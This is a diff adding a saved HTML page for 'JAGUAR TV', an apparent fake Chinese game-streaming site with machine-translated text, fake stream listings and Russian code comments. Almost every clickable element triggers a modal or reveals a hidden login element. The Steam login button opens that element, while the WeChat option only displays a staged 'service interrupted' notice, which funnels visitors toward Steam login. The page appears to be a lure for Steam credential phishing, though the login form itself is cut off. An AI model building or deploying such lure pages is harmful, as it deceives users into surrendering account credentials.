@@ -1,0 +1,1591 @@
+<!DOCTYPE html>
+<!-- saved from url=(0022)https://jaguarlive.cn/ -->
+<html class="no-js" lang=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+
+    <title>JAGUAR TV是一个流行的国际游戏和流媒体平台，供世界各地的初学者使用。 </title>
+    <meta name="title" content="JAGUAR TV是一个流行的国际游戏和流媒体平台，供世界各地的初学者使用。">
+    <meta name="description" content="该平台也有社交网络的迹象：它允许用户添加朋友，用 &quot;喜欢 &quot;标记广播，对视频进行评论">
+    <meta name="keywords" content="tencent tv,游戏,b站,斗鱼, chinese streaming site, bilibili, tengxun tv, bilibili 註冊, bilibili 海外, bi li, douyutv, douyu, douyu tv, MEOW TV, dogetv183, Meow TV, meow24, huya, 虎牙吧, NetEase">
+    <link href="https://jaguarlive.cn/indi.jpg" rel="image_src">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="JAGUAR TV是一个流行的国际游戏和流媒体平台，供世界各地的初学者使用。">
+    <meta property="og:description" content="该平台也有社交网络的迹象：它允许用户添加朋友，用 &quot;喜欢 &quot;标记广播，对视频进行评论">
+    <meta property="og:image" content="https://jaguarlive.cn/indi.jpg">
+	<meta property="og:url" content="https://jaguarlive.cn">
+
+    <link rel="stylesheet" href="css/semantic.min.css">
+    
+    <link rel="icon" type="image/png" href="https://jaguarlive.cn/favicon.png">
+   
+
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="css/slick.css">
+    <link rel="stylesheet" href="css/slick-theme.css">
+    <link rel="stylesheet" href="css/main.css">
+    <meta name="theme-color" content="#fafafa">
+ <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.css"/>
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick-theme.css"/>
+	<style>
+        body {
+            background-color: #f5f5f5;
+        }
+    </style>
+    
+    <script src="img/jquery.min.js"></script>
+</head>
+<body>
+
+    <style>
+        /* Стили для всех экранов */
+        body{
+            margin: 0;
+            background-color: #ccc;
+        }
+        #cookie-notification {
+            position: fixed;
+    left: 50%;
+    bottom: -250px;
+    width: 100%;
+    max-width: 4000px;
+    padding: 20px;
+    background-color: #1b1c1d;
+    display: none;
+    z-index: 9999999;
+    transform: translateX(-50%);
+    color: antiquewhite;
+    box-shadow: 0 0 20px rgba(0,0,0,0.2);
+    text-align: center;
+        }
+        #cookie-notification i.icon {
+            margin-right: 10px;
+        }
+        #cookie-notification .btn-agree {
+            display: block;
+    margin: -56px auto 0;
+    background-color: #fbfbfb;
+    color: #000;
+    padding: 10px 20px;
+    border-radius: 5px;
+    cursor: pointer;
+    float: right;
+        }
+        #cookie-notification img.logo {
+            max-height: 50px;
+            margin: 0;
+            float: left;
+        }
+        #cookie-notification .header {
+            margin: 0 0 10px 60px;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        
+        /* Стили для телефонов с шириной экрана до 600px */
+        @media screen and (max-width: 600px) {
+            #cookie-notification {
+                width: 104%;
+                max-width: 600px;
+                padding: 10px;
+            }
+            #cookie-notification .header {
+                font-size: 18px;
+                margin: 0 0 5px 10px;
+            }
+            #cookie-notification .btn-agree {
+                margin: -29px auto 0;
+                padding: 5px 10px;
+            }
+            #cookie-notification img.logo {
+                max-height: 30px;
+                margin: 0 0 5px 10px;
+            }
+        }
+    </style>
+    <div id="cookie-notification" style="display: none; bottom: 0px; transition-duration: 0.5s;">
+        <img class="logo" src="img/logo.png">
+        <div class="header">我们使用cookies!</div>
+        <p>本网站使用cookies以确保最佳的用户体验。</p>
+        <button class="btn-agree">同意的</button>
+    </div>
+    
+    <script>
+        $(document).ready(function() {
+            if ($(window).width() < 768) {
+                return;
+            }
+        
+            let cookieNotification = $("#cookie-notification");
+            
+            // Check if cookie notification has already been dismissed
+            if (getCookie('cookieNotificationDismissed') === 'true') {
+                cookieNotification.hide();
+            } else {
+                cookieNotification.show();
+                
+                // Dismiss cookie notification
+                cookieNotification.find(".btn-agree, .close").click(function() {
+                    setCookie('cookieNotificationDismissed', 'true', 365);
+                    cookieNotification.fadeOut(1000);
+                });
+            }
+            
+            // Hide cookie notification when login form is visible
+            $(window).scroll(function() {
+                if (!$('.login').is(':visible')) {
+                    cookieNotification.css({ "bottom": "0px", "transition-duration": "0.5s" });
+                } else {
+                    cookieNotification.hide();
+                }
+            });
+        });
+    
+        function setCookie(name, value, days) {
+            let expires = "";
+            if (days) {
+                let date = new Date();
+                date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+                expires = "; expires=" + date.toUTCString();
+            }
+            document.cookie = name + "=" + (value || "") + expires + "; path=/";
+        }
+    
+        function getCookie(name) {
+            let nameEQ = name + "=";
+            let ca = document.cookie.split(';');
+            for (let i = 0; i < ca.length; i++) {
+                let c = ca[i];
+                while (c.charAt(0) === ' ') c = c.substring(1, c.length);
+                if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
+            }
+            return null;
+        }
+    </script>
+    
+    
+    
+
+    
+    <style>/* Segment */
+    
+        .segment:nth-child(4){
+         transform:translatex(0px) translatey(0px);
+        }
+        
+        @media (max-width:767px){
+        
+         /* Item */
+         #footer .secondary .item:nth-child(2){
+          display:none;
+         }
+         
+         /* Item */
+         #footer .secondary .item:nth-child(3){
+          display:none;
+         }
+         
+         /* Item */
+         #footer .secondary .item:nth-child(4){
+          display:none;
+         }
+         
+         /* Item */
+         #footer .secondary .item:nth-child(5){
+          display:none;
+         }
+         
+         /* Item */
+         #footer .secondary .item:nth-child(6){
+          display:none;
+         }
+         
+         /* Item */
+         #footer .secondary .menu .item{
+          display:none;
+         }
+         
+         /* Item */
+         #footer .secondary > .item:nth-child(1){
+          margin-left:0px;
+          margin-right:0px !important;
+          left:252px !important;
+         }
+         
+         /* Game inner */
+         .games-slider .game:nth-child(15) .game-inner{
+          min-height:360px;
+          padding-bottom:0px;
+         }
+         
+         /* Game inner */
+         .games-slider .game:nth-child(12) .game-inner{
+          min-height:360px;
+         }
+         
+         /* Game inner */
+         .games-slider .game:nth-child(9) .game-inner{
+          min-height:360px;
+         }
+         
+         /* Image */
+         .games-slider .game:nth-child(15) img{
+          min-height:298px;
+         }
+         
+         /* Image */
+         .games-slider .game:nth-child(12) img{
+          min-height:303px;
+         }
+         
+         /* Image */
+         .games-slider .game:nth-child(13) img{
+          min-height:303px;
+         }
+         
+         /* Image */
+         .games-slider .game:nth-child(9) img{
+          min-height:299px;
+         }
+         
+         /* Image */
+         .games-slider .game:nth-child(6) img{
+          min-height:272px;
+         }
+         
+         /* Game inner */
+         .games-slider .game:nth-child(7) .game-inner{
+          min-height:333px;
+         }
+         
+        }
+        
+        @media (max-width:600px){
+        
+         /* Item */
+         #footer .secondary > .item:nth-child(1){
+          left:215px !important;
+         }
+         
+         /* Intro */
+         main .intro{
+          transform:translatex(0px) translatey(0px);
+         }
+         
+         /* Game inner */
+         main .games .container .games-inner .games-slider .slick-list .slick-track .slick-current div .games-list .row .game:nth-child(10) .game-inner{
+          width:100% !important;
+         }
+         
+         /* Image */
+         .games-slider .game:nth-child(11) img{
+          width:220px;
+          max-width:220px;
+         }
+         
+         /* Column 6/12 */
+         .games-slider div .game:nth-child(11){
+          padding-left:0px;
+         }
+         
+        }
+        
+        @media (max-width:450px){
+        
+         /* Item */
+         #footer .secondary > .item:nth-child(1){
+          left:137px !important;
+         }
+         
+         /* Game inner */
+         .games-slider .game:nth-child(14) .game-inner{
+          min-height:360px;
+          transform:translatex(0px) translatey(0px);
+         }
+         
+         /* Image */
+         .games-slider .game:nth-child(14) img{
+          min-height:298px;
+         }
+         
+         /* Game inner */
+         .games-slider .game:nth-child(10) .game-inner{
+          min-height:323px;
+          transform:translatex(0px) translatey(0px);
+         }
+         
+         /* Image */
+         .games-slider .game:nth-child(10) img{
+          min-height:267px;
+         }
+         
+         /* Game inner */
+         .games-slider .game:nth-child(8) .game-inner{
+          min-height:360px;
+          transform:translatex(0px) translatey(0px);
+         }
+         
+         /* Image */
+         .games-slider .game:nth-child(8) img{
+          min-height:299px;
+         }
+         
+         /* Image */
+         .games-slider .game:nth-child(7) img{
+          min-height:272px;
+         }
+         
+         /* Container */
+         main .intro .container{
+          transform:translatex(0px) translatey(0px);
+         }
+         
+         /* Menu */
+         .segment .secondary .desktop-only{
+          position:relative;
+         }
+         
+         /* Item */
+         .segment:nth-child(4) .secondary .item:nth-child(5){
+          left:-41px;
+          bottom:0px;
+          min-width:0px;
+          box-shadow:0px 0px 0px -5px rgba(255,255,255,0.7);
+          transform: translatex(-12px);
+          border-top-right-radius:0px;
+          border-width:0px;
+          border-bottom-style:none;
+          border-bottom-width:2px;
+         }
+         
+         /* Item */
+         .segment:nth-child(4) .secondary .item:nth-child(6){
+          left:-53px;
+         }
+         
+         /* Segment */
+         .segment:nth-child(4){
+          min-height:0px;
+         }
+         
+        }</style>
+
+<div id="up" class="ui inverted segment">
+  <div class="ui inverted secondary menu">
+    <a href="/" class="item" style="margin-right: 1em;">
+      <img src="img/logo.png" id="logo" style="width:150px;">
+    </a>
+     <!-- Show new menu button for mobile only -->
+    <a onclick="showModal(event);" class="item"><i class="fa-solid fa-gamepad"></i>&nbsp;主页面</a>
+      <a onclick="showModal(event);" class="item"><i class="fa-solid fa-video"></i>&nbsp;社区</a>
+      <a onclick="showModal(event);" class="item"><i class="fa-solid fa-users"></i>&nbsp;锦标赛</a>
+      <a onclick="showModal(event);" class="item"><i class="fa-regular fa-handshake"></i></i>&nbsp;团队</a>
+      <a onclick="showModal(event);" class="item"><i class="fa-brands fa-github-alt"></i>&nbsp;支持</a>
+    <div class="right menu desktop-only">
+      <div class="item">
+        <div class="ui icon input">
+          <input type="text" placeholder="Search..." style="border-radius: 20px; background-color: #f5f5f5;" onkeypress="if(event.keyCode === 13) {document.querySelector(&#39;.login&#39;).style.display = &#39;block&#39;}">
+        </div>
+      </div>
+      <div class="item">
+        <a class="ui steam big button" onclick="document.querySelector(&#39;.login&#39;).style.display = &#39;block&#39;"><i class="fa-brands fa-steam-symbol"></i>&nbsp;通过Steam登录</a>
+      </div>
+      <div class="item">
+        <a class="ui wechat big button" id="wechat"><i class="fa-brands fa-weixin"></i>&nbsp;通过微信登录</a>
+      </div>
+    </div>
+  </div>
+</div>
+<style>#up {
+    overflow-x: auto;
+    -webkit-overflow-scrolling: touch; /* for smoother scrolling on iOS devices */
+  }
+  </style>
+
+    
+  
+
+<script>
+    $(document).ready(function(){
+        let notification = $('<div></div>');
+        notification.html('<i class="fa-solid fa-circle-exclamation"></i> 对不起，微信服务暂时中断了。请稍后再试。');
+        notification.css({
+            backgroundColor: 'red',
+            color: 'white',
+            padding: '1em',
+            position: 'fixed',
+            top: '50%',
+            left: '50%',
+            transform: 'translate(-50%, -50%)',
+            zIndex: '9999',
+            display: 'none'
+        });
+        $('body').append(notification);
+    
+        $("#wechat-btn, #wechat").click(function(){
+            notification.fadeIn();
+            setTimeout(function(){
+                notification.fadeOut();
+            }, 2000);
+        });
+    });
+    </script>
+
+
+
+    
+    <style>
+        #logo:hover {
+            filter: saturate(4);
+        }
+    
+        #wechat:hover {
+            background-color: #7BB32E;
+            color: white;
+        }
+    
+        .steam:hover {
+            background-color: #2196F3 !important;
+            color: #fff !important;
+        }
+        .ui.inverted.segment {
+  margin: -2px;
+}
+i.search.icon {
+  cursor: pointer;
+}
+
+i.search.icon:hover {
+  opacity: 0.8; /* Optional: reduce the opacity of the icon when hovering */
+}.intro {
+  background-image: url('img/back.jpeg');
+  background-size: cover; /* adjust to your needs */
+}
+    </style>
+    
+      
+
+<main>
+    <div class="intro" data-src="img/back.jpeg">
+        <div class="container">
+            <div class="intro-content">
+                <h1>JAGUAR TV - 你的荣幸</h1>
+               <div class="intro-text-slides">
+        <div class="intro-slide">
+            <h2>登录并开始使用我们的彩带,<br>
+                成为流光并获得奖励！<br>
+                我们的平台奖励您的活动<br>
+                给你很多功能<br>
+            </h2>
+        </div>
+        <div class="intro-slide">
+            <h2>登录并开始使用我们的彩带,<br>
+                成为流光并获得奖励！<br>
+                我们的平台奖励您的活动<br>
+                给你很多功能<br>
+            </h2>
+        </div>
+        <div class="intro-slide">
+            <h2>登录并开始使用我们的彩带,<br>
+                成为流光并获得奖励！<br>
+                我们的平台奖励您的活动<br>
+                给你很多功能<br>
+            </h2>
+        </div>
+    </div>
+                <div class="slick-slider-dots"><ul class="slick-dots" role="tablist" style=""><li class="" role="presentation"><button type="button" role="tab" id="slick-slide-control00" aria-controls="slick-slide00" aria-label="1 of 3" tabindex="-1">1</button></li><li role="presentation" class="slick-active"><button type="button" role="tab" id="slick-slide-control01" aria-controls="slick-slide01" aria-label="2 of 3" tabindex="0" aria-selected="true">2</button></li><li role="presentation" class=""><button type="button" role="tab" id="slick-slide-control02" aria-controls="slick-slide02" aria-label="3 of 3" tabindex="-1">3</button></li></ul></div>
+            </div>
+        </div>
+     
+    </div>
+    <div class="streams">
+        <div class="streams-left-shape">
+            
+        </div>
+        <div class="streams-left-hero">
+            <img class="lazy" data-src="img/player_left_hero.png" alt="">
+        </div>
+        <div class="container">
+            <div class="streams-heading">
+                <h2>Live</h2>
+            </div>
+            <div class="stream-video-wrapper">
+<div class="stream-wrapper">
+<div id="app1" class="video-active">
+<div class="video-wrap">
+    <div id="video-container"><video src="video/bgmovie.mp4" loop="" autoplay="" muted></video></div>
+    <script>
+      window.addEventListener('load', function() {
+        var video = document.createElement('video');
+        video.src = "video/bgmovie.mp4";
+        video.muted = true;
+        video.loop = true;
+        video.autoplay = true;
+        document.getElementById('video-container').appendChild(video);
+      });
+    </script>
+
+</div>
+</div>
+
+</div>
+<div class="stream-preview-wrapper">
+<div class="streamer-box" onclick="showModal(event);" id="streamer1" data-videoid="1">
+<video class="lazy" autoplay="" muted="" loop="" data-loader="av"><source src="" type="video/mp4"></video>
+<img class="border-hover" src="img/streamer_border.png" alt="">
+<img src="img/streamerr2.png" class="streamer-photo lazy" alt="">
+</div>
+<div class="streamer-box" onclick="showModal(event);" id="streamer2" data-videoid="2">
+<video class="lazy" autoplay="" muted="" loop="" data-loader="av"><source src="" type="video/mp4"></video>
+<img class="border-hover" src="img/streamer_border.png" alt="">
+<img src="img/streamer.png" class="streamer-photo lazy" alt="">
+</div>
+<div class="streamer-box" onclick="showModal(event);" id="streamer3" data-videoid="3">
+<video class="lazy" autoplay="" muted="" loop="" data-loader="av"><source src="" type="video/mp4"></video>
+<img class="border-hover" src="img/streamer_border.png" alt="">
+<img src="img/streamerr1.png" class="streamer-photo lazy" alt="">
+</div>
+<div class="streamer-box" onclick="showModal(event);" id="streamer4" data-videoid="4">
+<video class="lazy" autoplay="" muted="" loop="" data-loader="av"><source src="" type="video/mp4"></video>
+<img class="border-hover" src="img/streamer_border.png" alt="">
+<img src="img/streamer_1.png" class="streamer-photo lazy" alt="">
+</div>
+</div>
+</div>
+            <div class="streamed-games-wrapper">
+  <div class="categories-arrows">
+    <button class="slick-prev slick-arrow">
+      <img src="img/arrow-left.png" />
+    </button>
+    <button class="slick-next slick-arrow">
+      <img src="img/arrow-right.png" />
+    </button>
+  </div>
+  <div class="categories">
+    <a class="category active" id="category1" data-slide="1">
+      <img src="img/cat1-inactive.png" alt="" />
+      <h3>网游竞技</h3>
+      <svg
+        class="category-line"
+        xmlns="http://www.w3.org/2000/svg"
+        width="113px"
+        height="3px"
+      >
+        <defs>
+          <lineargradient id="PSgrad_0" x1="0%" x2="0%" y1="0%" y2="100%">
+            <stop
+              offset="0%"
+              stop-color="rgb(145,106,194)"
+              stop-opacity="1"
+            ></stop>
+            <stop
+              offset="100%"
+              stop-color="rgb(191,89,189)"
+              stop-opacity="1"
+            ></stop>
+          </lineargradient>
+        </defs>
+        <path
+          fill-rule="evenodd"
+          fill="rgb(255, 255, 255)"
+          d="M1.500,-0.000 L111.500,-0.000 C112.328,-0.000 113.000,0.671 113.000,1.500 C113.000,2.328 112.328,3.000 111.500,3.000 L1.500,3.000 C0.672,3.000 -0.000,2.328 -0.000,1.500 C-0.000,0.671 0.672,-0.000 1.500,-0.000 Z"
+        ></path>
+        <path
+          fill="url(#PSgrad_0)"
+          d="M1.500,-0.000 L111.500,-0.000 C112.328,-0.000 113.000,0.671 113.000,1.500 C113.000,2.328 112.328,3.000 111.500,3.000 L1.500,3.000 C0.672,3.000 -0.000,2.328 -0.000,1.500 C-0.000,0.671 0.672,-0.000 1.500,-0.000 Z"
+        ></path>
+      </svg>
+    </a>
+    <a class="category" id="category2" data-slide="2">
+      <img src="img/cat2-inactive.png" alt="" />
+      <h3>单机热游</h3>
+      <svg
+        class="category-line"
+        xmlns="http://www.w3.org/2000/svg"
+        width="113px"
+        height="3px"
+      >
+        <defs>
+          <lineargradient id="PSgrad_0" x1="0%" x2="0%" y1="0%" y2="100%">
+            <stop
+              offset="0%"
+              stop-color="rgb(145,106,194)"
+              stop-opacity="1"
+            ></stop>
+            <stop
+              offset="100%"
+              stop-color="rgb(191,89,189)"
+              stop-opacity="1"
+            ></stop>
+          </lineargradient>
+        </defs>
+        <path
+          fill-rule="evenodd"
+          fill="rgb(255, 255, 255)"
+          d="M1.500,-0.000 L111.500,-0.000 C112.328,-0.000 113.000,0.671 113.000,1.500 C113.000,2.328 112.328,3.000 111.500,3.000 L1.500,3.000 C0.672,3.000 -0.000,2.328 -0.000,1.500 C-0.000,0.671 0.672,-0.000 1.500,-0.000 Z"
+        ></path>
+        <path
+          fill="url(#PSgrad_0)"
+          d="M1.500,-0.000 L111.500,-0.000 C112.328,-0.000 113.000,0.671 113.000,1.500 C113.000,2.328 112.328,3.000 111.500,3.000 L1.500,3.000 C0.672,3.000 -0.000,2.328 -0.000,1.500 C-0.000,0.671 0.672,-0.000 1.500,-0.000 Z"
+        ></path>
+      </svg>
+    </a>
+    <a class="category" id="category3" data-slide="3">
+      <img src="img/cat3-inactive.png" alt="" />
+      <h3>娱乐天地</h3>
+      <svg
+        class="category-line"
+        xmlns="http://www.w3.org/2000/svg"
+        width="113px"
+        height="3px"
+      >
+        <defs>
+          <lineargradient id="PSgrad_0" x1="0%" x2="0%" y1="0%" y2="100%">
+            <stop
+              offset="0%"
+              stop-color="rgb(145,106,194)"
+              stop-opacity="1"
+            ></stop>
+            <stop
+              offset="100%"
+              stop-color="rgb(191,89,189)"
+              stop-opacity="1"
+            ></stop>
+          </lineargradient>
+        </defs>
+        <path
+          fill-rule="evenodd"
+          fill="rgb(255, 255, 255)"
+          d="M1.500,-0.000 L111.500,-0.000 C112.328,-0.000 113.000,0.671 113.000,1.500 C113.000,2.328 112.328,3.000 111.500,3.000 L1.500,3.000 C0.672,3.000 -0.000,2.328 -0.000,1.500 C-0.000,0.671 0.672,-0.000 1.500,-0.000 Z"
+        ></path>
+        <path
+          fill="url(#PSgrad_0)"
+          d="M1.500,-0.000 L111.500,-0.000 C112.328,-0.000 113.000,0.671 113.000,1.500 C113.000,2.328 112.328,3.000 111.500,3.000 L1.500,3.000 C0.672,3.000 -0.000,2.328 -0.000,1.500 C-0.000,0.671 0.672,-0.000 1.500,-0.000 Z"
+        ></path>
+      </svg>
+    </a>
+    <a class="category" id="category4" data-slide="4">
+      <img src="img/cat4-inactive.png" alt="" />
+      <h3>手游休闲</h3>
+      <svg
+        class="category-line"
+        xmlns="http://www.w3.org/2000/svg"
+        width="113px"
+        height="3px"
+      >
+        <defs>
+          <lineargradient id="PSgrad_0" x1="0%" x2="0%" y1="0%" y2="100%">
+            <stop
+              offset="0%"
+              stop-color="rgb(145,106,194)"
+              stop-opacity="1"
+            ></stop>
+            <stop
+              offset="100%"
+              stop-color="rgb(191,89,189)"
+              stop-opacity="1"
+            ></stop>
+          </lineargradient>
+        </defs>
+        <path
+          fill-rule="evenodd"
+          fill="rgb(255, 255, 255)"
+          d="M1.500,-0.000 L111.500,-0.000 C112.328,-0.000 113.000,0.671 113.000,1.500 C113.000,2.328 112.328,3.000 111.500,3.000 L1.500,3.000 C0.672,3.000 -0.000,2.328 -0.000,1.500 C-0.000,0.671 0.672,-0.000 1.500,-0.000 Z"
+        ></path>
+        <path
+          fill="url(#PSgrad_0)"
+          d="M1.500,-0.000 L111.500,-0.000 C112.328,-0.000 113.000,0.671 113.000,1.500 C113.000,2.328 112.328,3.000 111.500,3.000 L1.500,3.000 C0.672,3.000 -0.000,2.328 -0.000,1.500 C-0.000,0.671 0.672,-0.000 1.500,-0.000 Z"
+        ></path>
+      </svg>
+    </a>
+  </div>
+  <div class="categories-previews" style="width: 100%; display: inline-block;">
+    <div class="categories-previews-row slide" style="width: 100%; display: flex;">
+      <div class="category-preview">
+                                <div class="category-preview-inner">
+                                    <a href="stream-369.html" onclick="showModal(event);" tabindex="0">
+                                        <img alt="" class="" src="img/category_game1.png" style="opacity: 1;">
+                                    </a>
+                                    <div class="preview-icons">
+                                        <a href="stream-369.html" tabindex="0">
+                                            <img class="preview-icon-play" src="img/play-icon.png" alt="">
+                                            <img class="preview-icon-live" src="img/live.png" alt="">
+                                        </a>
+                                    </div>
+                                    <div class="category-preview-inner-desc">
+                                        <h4 onclick="showModal(event);">猎杀局干啪他</h4>
+                                        <p onclick="showModal(event);">apex legends heroes</p>
+                                        <div>
+                                            <span onclick="showModal(event);">102.4万</span>
+                                            <a href="stream-369.html" tabindex="0">观察一下</a>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+      <div class="category-preview">
+        <div class="category-preview-inner">
+          <a
+             
+            onclick="showModal(event);"
+            tabindex="-1"
+          >
+            <img data-lazy="img/162.jpg" alt="" class="slick-loading" />
+          </a>
+          <div class="preview-icons">
+            <a href="stream-369.html" tabindex="-1">
+              <img class="preview-icon-play" src="img/play-icon.png" alt="" />
+              <img class="preview-icon-live" src="img/live.png" alt="" />
+            </a>
+          </div>
+          <div class="category-preview-inner-desc">
+            <h4 onclick="showModal(event);">柚子： 你好</h4>
+            <p onclick="showModal(event);">炉石传说</p>
+            <div>
+              <span onclick="showModal(event);">78.4万</span>
+              <a href="stream-369.html" tabindex="-1"
+                >观察一下</a
+              >
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="category-preview">
+        <div class="category-preview-inner">
+          <a
+             
+            onclick="showModal(event);"
+            tabindex="-1"
+          >
+            <img data-lazy="img/163.jpg" alt="" class="slick-loading" />
+          </a>
+          <div class="preview-icons">
+            <a href="stream-369.html" tabindex="-1">
+              <img class="preview-icon-play" src="img/play-icon.png" alt="" />
+              <img class="preview-icon-live" src="img/live.png" alt="" />
+            </a>
+          </div>
+          <div class="category-preview-inner-desc">
+            <h4 onclick="showModal(event);">美测开冲！</h4>
+            <p onclick="showModal(event);">lol云顶之弈</p>
+            <div>
+              <span onclick="showModal(event);">178.5万</span>
+              <a href="stream-369.html" tabindex="-1"
+                >观察一下</a
+              >
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="category-preview">
+        <div class="category-preview-inner">
+          <a
+             
+            onclick="showModal(event);"
+            tabindex="-1"
+          >
+            <img data-lazy="img/164.jpg" alt="" class="slick-loading" />
+          </a>
+          <div class="preview-icons">
+            <a href="stream-369.html" tabindex="-1">
+              <img class="preview-icon-play" src="img/play-icon.png" alt="" />
+              <img class="preview-icon-live" src="img/live.png" alt="" />
+            </a>
+          </div>
+          <div class="category-preview-inner-desc">
+            <h4 onclick="showModal(event);">美测王者八排！</h4>
+            <p onclick="showModal(event);">lol云顶之弈</p>
+            <div>
+              <span onclick="showModal(event);">87万</span>
+              <a href="stream-369.html" tabindex="-1"
+                >观察一下</a
+              >
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="category-preview">
+        <div class="category-preview-inner">
+          <a
+             
+            onclick="showModal(event);"
+            tabindex="-1"
+          >
+            <img data-lazy="img/165.jpg" alt="" class="slick-loading" />
+          </a>
+          <div class="preview-icons">
+            <a href="stream-369.html" tabindex="-1">
+              <img class="preview-icon-play" src="img/play-icon.png" alt="" />
+              <img class="preview-icon-live" src="img/live.png" alt="" />
+            </a>
+          </div>
+          <div class="category-preview-inner-desc">
+            <h4 onclick="showModal(event);">巅峰赛屠龙！</h4>
+            <p onclick="showModal(event);">王者荣耀</p>
+            <div>
+              <span onclick="showModal(event);">39.9万</span>
+              <a href="stream-369.html" tabindex="-1"
+                >观察一下</a
+              >
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="categories-previews-row slide" style="width: 100%; display: flex;">
+      <div class="category-preview">
+        <div class="category-preview-inner">
+          <a
+            href="stream-369.html"
+            onclick="showModal(event);"
+            tabindex="0"
+          >
+            <img
+              alt=""
+              class=""
+              src="img/category_game1.png"
+              style="opacity: 1;"
+            />
+          </a>
+          <div class="preview-icons">
+            <a href="stream-369.html" tabindex="0">
+              <img class="preview-icon-play" src="img/play-icon.png" alt="" />
+              <img class="preview-icon-live" src="img/live.png" alt="" />
+            </a>
+          </div>
+          <div class="category-preview-inner-desc">
+            <h4 onclick="showModal(event);">猎杀局干啪他</h4>
+            <p onclick="showModal(event);">apex legends heroes</p>
+            <div>
+              <span onclick="showModal(event);">102.4万</span>
+              <a href="stream-369.html" tabindex="0"
+                >观察一下</a
+              >
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="category-preview">
+        <div class="category-preview-inner">
+          <a href="stream-369.html" tabindex="0">
+            <img
+              alt=""
+              class=""
+              src="img/category_game2.png"
+              style="opacity: 1;"
+            />
+          </a>
+          <div class="preview-icons">
+            <a href="stream-369.html" tabindex="0">
+              <img class="preview-icon-play" src="img/play-icon.png" alt="" />
+              <img class="preview-icon-live" src="img/live.png" alt="" />
+            </a>
+          </div>
+          <div class="category-preview-inner-desc">
+            <h4 onclick="showModal(event);">猎杀体验时间</h4>
+            <p onclick="showModal(event);">apex legends heroes</p>
+            <div>
+              <span onclick="showModal(event);">242.6万</span>
+              <a href="stream-369.html" tabindex="0"
+                >观察一下</a
+              >
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="category-preview">
+        <div class="category-preview-inner">
+          <a href="stream-369.html" tabindex="0">
+            <img alt="" class="" src="img/131.jpg" style="opacity: 1;" />
+          </a>
+          <div class="preview-icons">
+            <a href="stream-369.html" tabindex="0">
+              <img class="preview-icon-play" src="img/play-icon.png" alt="" />
+              <img class="preview-icon-live" src="img/live.png" alt="" />
+            </a>
+          </div>
+          <div class="category-preview-inner-desc">
+            <h4 onclick="showModal(event);">【菊花】无挂服天花</h4>
+            <p onclick="showModal(event);">PUBG</p>
+            <div>
+              <span onclick="showModal(event);">342.6万</span>
+              <a href="stream-369.html" tabindex="0"
+                >观察一下</a
+              >
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="category-preview">
+        <div class="category-preview-inner">
+          <a
+             
+            onclick="showModal(event);"
+            tabindex="0"
+          >
+            <img alt="" class="" src="img/132.png" style="opacity: 1;" />
+          </a>
+          <div class="preview-icons">
+            <a href="stream-369.html" tabindex="0">
+              <img class="preview-icon-play" src="img/play-icon.png" alt="" />
+              <img class="preview-icon-live" src="img/live.png" alt="" />
+            </a>
+          </div>
+          <div class="category-preview-inner-desc">
+            <h4 onclick="showModal(event);">CzYYY369幸运地相遇</h4>
+            <p onclick="showModal(event);">CSGO</p>
+            <div>
+              <span onclick="showModal(event);">97.4万</span>
+              <a href="stream-369.html" tabindex="0"
+                >观察一下</a
+              >
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="category-preview">
+        <div class="category-preview-inner">
+          <a
+             
+            onclick="showModal(event);"
+            tabindex="0"
+          >
+            <img alt="" class="" src="img/133.jpg" style="opacity: 1;" />
+          </a>
+          <div class="preview-icons">
+            <a href="stream-369.html" tabindex="0">
+              <img class="preview-icon-play" src="img/play-icon.png" alt="" />
+              <img class="preview-icon-live" src="img/live.png" alt="" />
+            </a>
+          </div>
+          <div class="category-preview-inner-desc">
+            <h4 onclick="showModal(event);">峡谷之巅直逼第</h4>
+            <p onclick="showModal(event);">LOL英雄联盟</p>
+            <div>
+              <span onclick="showModal(event);">317.2万</span>
+              <a href="stream-369.html" tabindex="0"
+                >观察一下</a
+              >
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="categories-previews-row slide" style="width: 100%; display: flex;">
+      <div class="category-preview">
+        <div class="category-preview-inner">
+          <a
+            href="stream-369.html"
+            onclick="showModal(event);"
+            tabindex="-1"
+          >
+            <img data-lazy="img/144.jpg" alt="" class="slick-loading" />
+          </a>
+          <div class="preview-icons">
+            <a href="stream-369.html" tabindex="-1">
+              <img class="preview-icon-play" src="img/play-icon.png" alt="" />
+              <img class="preview-icon-live" src="img/live.png" alt="" />
+            </a>
+          </div>
+          <div class="category-preview-inner-desc">
+            <h4 onclick="showModal(event);">枪王排位冲冲冲</h4>
+            <p onclick="showModal(event);">CFHD</p>
+            <div>
+              <span onclick="showModal(event);">113.2万</span>
+              <a href="stream-369.html" tabindex="-1"
+                >观察一下</a
+              >
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="category-preview">
+        <div class="category-preview-inner">
+          <a
+             
+            onclick="showModal(event);"
+            tabindex="-1"
+          >
+            <img data-lazy="img/145.jpg" alt="" class="slick-loading" />
+          </a>
+          <div class="preview-icons">
+            <a href="stream-369.html" tabindex="-1">
+              <img class="preview-icon-play" src="img/play-icon.png" alt="" />
